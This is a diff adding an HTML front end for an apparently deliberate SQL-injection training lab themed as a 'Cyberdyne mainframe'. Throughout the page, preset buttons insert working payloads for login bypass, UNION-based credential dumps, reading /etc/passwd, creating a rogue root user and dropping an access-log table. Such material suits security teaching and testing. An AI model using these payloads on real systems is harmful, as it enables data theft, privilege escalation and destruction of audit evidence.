@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CYBERDYNE MAINFRAME</title>
+    <link rel="stylesheet" href="matrix_style.css">
+</head>
+<body>
+    <div class="scanlines"></div>
+    <div class="terminal">
+        <div class="header">
+            > CYBERDYNE MAINFRAME TERMINAL v10.0.1 [DEMO MODE]
+            <div class="ip-address">CONNECTED TO: 192.42.63.11</div>
+        </div>
+
+        <!-- AUTHENTICATION BYPASS PANEL -->
+        <div class="attack-panel">
+            <div class="panel-title">[ AUTHENTICATION BYPASS ]</div>
+            <form action="../backend/vulnerable/mainframe_access.php" method="POST">
+                <div class="blink">> BADGE_ID:</div>
+                <input type="text" name="badge_id" class="glow-input" placeholder="CD-XXX" id="badgeInput">
+                <button type="submit" name="action" value="login" class="hack-button">[ EXECUTE ]</button>
+                
+                <div class="injection-example" onclick="document.getElementById('badgeInput').value = `' OR '1'='1' -- `">
+                    > Basic Bypass: ' OR '1'='1' -- 
+                </div>
+                <div class="injection-example" onclick="document.getElementById('badgeInput').value = `ADMIN' -- `">
+                    > Admin Access: ADMIN' -- 
+                </div>
+                <div class="injection-example" onclick="document.getElementById('badgeInput').value = `' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6,7,8,9 FROM employees -- `">
+                    > Credential Dump: UNION SELECT
+                </div>
+            </form>
+        </div>
+
+        <!-- DATA EXFILTRATION PANEL -->
+        <div class="attack-panel">
+            <div class="panel-title">[ DATA EXFILTRATION ]</div>
+            <form action="../backend/vulnerable/mainframe_access.php" method="POST">
+                <div class="blink">> PROJECT SEARCH:</div>
+                <input type="text" name="search" class="glow-input" placeholder="Project name..." id="searchInput">
+                <button type="submit" name="action" value="search" class="hack-button">[ QUERY ]</button>
+                
+                <div class="injection-example" onclick="document.getElementById('searchInput').value = `%' UNION SELECT 1,@@version,3,4,5 -- `">
+                    > Database Version: UNION SELECT @@version
+                </div>
+                <div class="injection-example" onclick="document.getElementById('searchInput').value = `%' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database() -- `">
+                    > Table Enumeration
+                </div>
+                <div class="injection-example" onclick="document.getElementById('searchInput').value = `%' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 -- `">
+                    > File Read: /etc/passwd
+                </div>
+            </form>
+        </div>
+
+        <!-- SYSTEM TAKEOVER PANEL -->
+        <div class="attack-panel">
+            <div class="panel-title">[ SYSTEM TAKEOVER ]</div>
+            <form action="../backend/vulnerable/mainframe_access.php" method="POST">
+                <input type="hidden" name="action" value="admin">
+                
+                <div class="blink">> ADMIN OVERRIDE COMMAND:</div>
+                <input type="text" name="admin_action" class="glow-input" id="adminCommand" 
+                    placeholder="Enter malicious SQL payload">
+                
+                <button type="submit" class="hack-button">[ EXECUTE ]</button>
+                
+                <div class="injection-presets">
+                    <div class="injection-example" onclick="document.getElementById('adminCommand').value = `enable_root'; UPDATE employees SET access_level='root' WHERE username='hacker' -- `">
+                        > Privilege Escalation
+                    </div>
+                    <div class="injection-example" onclick="document.getElementById('adminCommand').value = `disable_firewall'; INSERT INTO employees (badge_id, username, password, access_level, secret_project, salary, ssn, last_login) VALUES ('666-666','hacker','pwned','root','SKYNET_OWNED',999999.00,'666-66-6666',NOW()) -- `">
+                        > Create Admin User
+                    </div>
+                    <div class="injection-example" onclick="document.getElementById('adminCommand').value = `wipe_logs'; DROP TABLE access_logs -- `">
+                        > Destroy Evidence
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- BLIND INJECTION PANEL -->
+        <div class="attack-panel">
+            <div class="panel-title">[ BLIND EXPLOITATION ]</div>
+            <form action="../backend/secured/" method="POST">
+                <div class="blink">> DEBUG CONSOLE:</div>
+                <input type="text" name="debug_cmd" class="glow-input" placeholder="Diagnostic command..." id="debugInput">
+                <button type="submit" name="action" value="debug" class="hack-button">[ EXECUTE ]</button>
+                
+                <div class="injection-example" 
+                    onclick="document.getElementById('debugInput').value = `' AND (SELECT 1 FROM (SELECT IF(SUBSTRING(@@version,1,1)='8',SLEEP(5),0)) as subquery) -- `">
+                    > Version Check (Working Time-Based)
+                </div>
+                <div class="injection-example" onclick="document.getElementById('debugInput').value = `' OR (SELECT COUNT(*) FROM nuclear_codes) > 0 -- `">
+                    > Check if nuclear_codes exists (OR)
+                </div>
+                <div class="injection-example" onclick="document.getElementById('debugInput').value = `' OR EXISTS (SELECT 1 FROM employees WHERE username='sysadmin' AND password LIKE 'K%') -- `">
+                    > Bruteforce password (OR condition)
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <div class="warning">⚠️ WARNING: THIS IS A DEMONSTRATION SYSTEM - REAL ATTACKS ARE ILLEGAL</div>
+</body>
+</html>
